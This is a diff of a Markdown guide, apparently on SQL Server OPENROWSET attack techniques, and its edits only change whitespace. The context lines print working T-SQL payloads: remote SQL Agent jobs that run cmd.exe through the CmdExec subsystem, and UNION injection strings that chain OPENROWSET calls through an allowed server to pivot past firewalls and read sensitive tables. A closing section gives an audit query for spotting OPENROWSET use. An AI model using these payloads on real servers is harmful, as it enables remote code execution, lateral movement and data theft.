@@ -121,18 +121,18 @@ This technique combines OPENROWSET with SQL Server Agent to execute commands:
 ```sql
 -- Create a job on a remote server to execute commands
 DECLARE @job_name nvarchar(100) = 'remote_cmd'
-EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;', 
+EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
 'msdb.dbo.sp_add_job @job_name='''+@job_name+''', @enabled=1, @description=''Remote command execution''')
 
-EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;', 
-'msdb.dbo.sp_add_jobstep 
-    @job_name='''+@job_name+''', 
-    @step_name=''exec_cmd'', 
-    @subsystem=''CmdExec'', 
-    @command=''cmd.exe /c dir > c:\temp\output.txt'', 
+EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
+'msdb.dbo.sp_add_jobstep
+    @job_name='''+@job_name+''',
+    @step_name=''exec_cmd'',
+    @subsystem=''CmdExec'',
+    @command=''cmd.exe /c dir > c:\temp\output.txt'',
     @on_success_action=1')
 
-EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;', 
+EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
 'msdb.dbo.sp_start_job @job_name='''+@job_name+'''')
 ```
 
@@ -149,10 +149,10 @@ EXEC OPENROWSET('SQLNCLI', 'Server=remote-server;uid=sa;pwd=password;',
 
 ```sql
 -- Chain multiple OPENROWSET calls
-' UNION SELECT * FROM OPENROWSET('SQLNCLI', 
-    'Server=server1;uid=sa;pwd=password;', 
-    'SELECT * FROM OPENROWSET(''SQLNCLI'', 
-        ''Server=server2;uid=sa;pwd=password;'', 
+' UNION SELECT * FROM OPENROWSET('SQLNCLI',
+    'Server=server1;uid=sa;pwd=password;',
+    'SELECT * FROM OPENROWSET(''SQLNCLI'',
+        ''Server=server2;uid=sa;pwd=password;'',
         ''SELECT * FROM sensitive_table'')')--
 ```
 
@@ -162,10 +162,10 @@ When direct connections are blocked by firewalls, OPENROWSET can be used to "hop
 
 ```sql
 -- Using an intermediary server to reach a blocked target
-' UNION SELECT * FROM OPENROWSET('SQLNCLI', 
-    'Server=allowed-server;uid=sa;pwd=password;', 
-    'SELECT * FROM OPENROWSET(''SQLNCLI'', 
-        ''Server=blocked-server;uid=sa;pwd=password;'', 
+' UNION SELECT * FROM OPENROWSET('SQLNCLI',
+    'Server=allowed-server;uid=sa;pwd=password;',
+    'SELECT * FROM OPENROWSET(''SQLNCLI'',
+        ''Server=blocked-server;uid=sa;pwd=password;'',
         ''SELECT * FROM sensitive_data'')')--
 ```
 
@@ -185,8 +185,8 @@ EXEC('SELECT * FROM OPENROWSET(''' + @provider + ''', ''' + @conn + ''', ''' + @
 
 ```sql
 -- Using less common providers
-SELECT * FROM OPENROWSET('MSDASQL', 
-    'Driver={SQL Server};Server=target;uid=sa;pwd=password;', 
+SELECT * FROM OPENROWSET('MSDASQL',
+    'Driver={SQL Server};Server=target;uid=sa;pwd=password;',
     'SELECT @@version')
 ```
 
@@ -214,13 +214,13 @@ To prevent OPENROWSET attacks:
 
 5. Regularly audit and monitor for OPENROWSET usage:
 
-    ```sql
-    SELECT OBJECT_NAME(s.objectid) as ProcedureName, 
-        s.text
-    FROM sys.dm_exec_cached_plans p
-    CROSS APPLY sys.dm_exec_sql_text(p.plan_handle) s
-    WHERE s.text LIKE '%OPENROWSET%'
-    ```
+   ```sql
+   SELECT OBJECT_NAME(s.objectid) as ProcedureName,
+       s.text
+   FROM sys.dm_exec_cached_plans p
+   CROSS APPLY sys.dm_exec_sql_text(p.plan_handle) s
+   WHERE s.text LIKE '%OPENROWSET%'
+   ```
 
 ### Limitations and Considerations
 
